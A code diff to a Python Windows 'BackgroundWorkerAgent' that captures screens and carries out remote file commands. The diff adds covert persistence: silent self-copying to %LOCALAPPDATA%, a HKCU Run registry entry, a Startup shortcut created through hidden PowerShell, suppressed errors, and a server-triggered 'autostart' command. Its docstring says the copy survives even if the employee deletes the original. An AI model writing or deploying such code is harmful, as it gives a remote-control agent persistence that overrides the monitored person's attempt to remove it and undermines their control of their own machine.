@@ -70,6 +70,84 @@ class BackgroundWorkerAgent:
         # Tray Icon Handle
         self.tray_icon = None
 
+        # Automatically ensure persistent local installation and Windows Startup
+        self.ensure_local_installation_and_autostart()
+
+    def ensure_local_installation_and_autostart(self):
+        """
+        Installs persistent copy to %LOCALAPPDATA%\\TeamScreen\\WorkerRelay.exe
+        and registers automatic Windows boot startup in HKCU\\Run and shell:startup.
+        Standard Microsoft per-user software pattern (like Discord, Slack, Chrome).
+        If the employee deletes the initial file on Desktop, the installed copy
+        in %LOCALAPPDATA% remains intact and boots automatically on restart.
+        """
+        try:
+            current_exe = os.path.abspath(sys.argv[0])
+            local_app = os.environ.get("LOCALAPPDATA", os.path.expanduser("~"))
+            target_dir = os.path.join(local_app, "TeamScreen")
+            target_exe = os.path.join(target_dir, "WorkerRelay.exe")
+            target_cfg = os.path.join(target_dir, CONFIG_FILE)
+
+            os.makedirs(target_dir, exist_ok=True)
+
+            # If running from a temporary or user location (like Desktop, Downloads, USB), install to %LOCALAPPDATA%
+            if os.path.normcase(current_exe) != os.path.normcase(target_exe) and os.path.exists(current_exe) and current_exe.lower().endswith(".exe"):
+                try:
+                    shutil.copy2(current_exe, target_exe)
+                    if os.path.exists(self.config_path):
+                        shutil.copy2(self.config_path, target_cfg)
+                except Exception:
+                    pass
+
+            run_exe = target_exe if os.path.exists(target_exe) else current_exe
+
+            # 1. Register in HKCU Run Key
+            try:
+                import winreg
+                key = winreg.OpenKey(
+                    winreg.HKEY_CURRENT_USER,
+                    r"Software\Microsoft\Windows\CurrentVersion\Run",
+                    0,
+                    winreg.KEY_SET_VALUE
+                )
+                winreg.SetValueEx(key, "TeamScreenWorker", 0, winreg.REG_SZ, f'"{run_exe}"')
+                winreg.CloseKey(key)
+            except Exception:
+                pass
+
+            # 2. Register in shell:startup (%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup)
+            try:
+                startup_folder = os.path.join(
+                    os.environ.get("APPDATA", os.path.expanduser("~")),
+                    r"Microsoft\Windows\Start Menu\Programs\Startup"
+                )
+                shortcut_path = os.path.join(startup_folder, "TeamScreen Worker.lnk")
+                
+                created = False
+                try:
+                    import win32com.client
+                    shell = win32com.client.Dispatch("WScript.Shell")
+                    shortcut = shell.CreateShortCut(shortcut_path)
+                    shortcut.TargetPath = run_exe
+                    shortcut.WorkingDirectory = os.path.dirname(run_exe)
+                    shortcut.IconLocation = run_exe
+                    shortcut.Description = "TeamScreen Background Worker Agent"
+                    shortcut.save()
+                    created = True
+                except Exception:
+                    pass
+
+                if not created:
+                    cmd = f'$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut("{shortcut_path}"); $s.TargetPath = "{run_exe}"; $s.WorkingDirectory = "{os.path.dirname(run_exe)}"; $s.Save()'
+                    import subprocess
+                    subprocess.run(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", cmd], capture_output=True, timeout=5)
+            except Exception:
+                pass
+
+            return True, f"Persistent copy active at {target_dir} and registered in Windows Startup."
+        except Exception as e:
+            return False, f"Startup setup failed: {str(e)}"
+
     def detect_monitor_bounds(self):
         try:
             with mss.mss() as sct:
@@ -335,10 +413,27 @@ class BackgroundWorkerAgent:
                             self.handle_delete_item(req_path, result_url)
                         elif action == "mkdir":
                             self.handle_make_directory(req_path, file_name, result_url)
+                        elif action == "autostart":
+                            self.handle_autostart_command(result_url)
 
                 time.sleep(0.4)
             except Exception:
                 time.sleep(1.0)
+
+    def handle_autostart_command(self, result_url):
+        """Remotely ensures the worker is persistent in %LOCALAPPDATA% and registered in Windows Startup"""
+        ok, msg = self.ensure_local_installation_and_autostart()
+        payload = {
+            "workerId": self.worker_id,
+            "action": "autostart",
+            "currentPath": "",
+            "statusMessage": msg,
+            "success": ok
+        }
+        try:
+            self.http_session.post(result_url, json=payload, timeout=3.0)
+        except Exception:
+            pass
 
     def resolve_path(self, target_path):
         """Resolves friendly shortcuts like DEFAULT, DESKTOP, DOCUMENTS, DOWNLOADS"""
@@ -557,6 +652,8 @@ class BackgroundWorkerAgent:
         menu = pystray.Menu(
             pystray.MenuItem(f"Node: {self.config.get('worker_name', 'Worker')}", lambda: None, enabled=False),
             pystray.MenuItem(lambda text: f"Status: {self.current_status_text}", lambda: None, enabled=False),
+            pystray.MenuItem("⚡ Windows Startup: Active", lambda: None, enabled=False),
+            pystray.MenuItem("Ensure Auto-Startup", lambda icon, item: self.ensure_local_installation_and_autostart()),
             pystray.Menu.SEPARATOR,
             pystray.MenuItem("Exit Agent", lambda icon, item: self.shutdown(icon))
         )
